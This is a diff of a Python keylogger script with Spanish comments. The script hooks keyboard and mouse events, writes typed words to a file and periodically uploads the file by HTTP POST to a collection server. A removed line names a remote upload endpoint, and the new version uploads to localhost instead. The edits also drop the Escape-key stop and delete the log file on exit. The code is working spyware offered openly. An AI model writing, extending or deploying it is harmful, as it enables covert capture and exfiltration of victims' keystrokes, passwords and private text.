@@ -20,14 +20,16 @@
          ░  ░  ░ ░          ░ ░      ░  ░   ░     ░  ░        ░  ░  ░ ░      ░ ░      ░ ░    
                ░                                                  ░        ░        ░        
 '''
-
+#Importamos librerias necesarias para el funcionamiento del keylogger
 import keyboard
 import mouse
 import requests
+import os
 
 palabra = ""
+line_count = 0
 
-def key(pulso):
+def key(pulso): #Función callback para detectar cuando se presiona una tecla
     global palabra
     if pulso.event_type == keyboard.KEY_DOWN:
         if pulso.name == "space":            
@@ -36,9 +38,9 @@ def key(pulso):
             palabra += pulso.name
 
 
-def on_click(click):
+def on_click(click): #Función callback para detectar cuando se presiona el click
     if isinstance(click, mouse.ButtonEvent):
-        if click.event_type == "down":  # Detecta cuando el botón se presiona
+        if click.event_type == "down":
             #print("click")
             save_word()
     
@@ -47,23 +49,24 @@ def on_click(click):
 keyboard.hook(key)
 mouse.hook(on_click)
 
-def save_word():        
-    with open("output.txt", "a") as file:
+def save_word(): #Crea un txt y va guardando palabras cada que se presione espacio
+    
+    global line_count
+    
+    with open("block.txt", "a") as file:
         file.write(palabra + "\n")
         
     #print(palabra + "\n")
-    
-    with open("output.txt", "r") as file:
-        line_count = sum(1 for line in file)
+    line_count += 1
         
-    
-    if line_count > 10:
-        send_server("output.txt")
+    if line_count >= 15:
+        send_server("block.txt")
+        line_count = 0
     reset()  
     
 
-def send_server(filename):
-    url = "https://keylogger-production.up.railway.app/upload"
+def send_server(filename): #Envía el txt al servidor con un POST
+    url = "http://127.0.0.1:5000/upload"
     with open(filename, "rb") as file:
         try:
             response = requests.post(url, files={"file": file})
@@ -72,15 +75,16 @@ def send_server(filename):
             return e
     
     
-def reset():
+def reset(): #Resetea la palabra
     global palabra
     palabra = ""
 
-try:
-    keyboard.wait("esc")
+try: #Detiene el scipt cuando se presiona Escape y llama a la función unhook_all()
+    keyboard.wait()
 except KeyboardInterrupt:
     #print("Script detenido")
     pass
 finally:
     keyboard.unhook_all()
     mouse.unhook_all()
+    os.remove("block.txt")
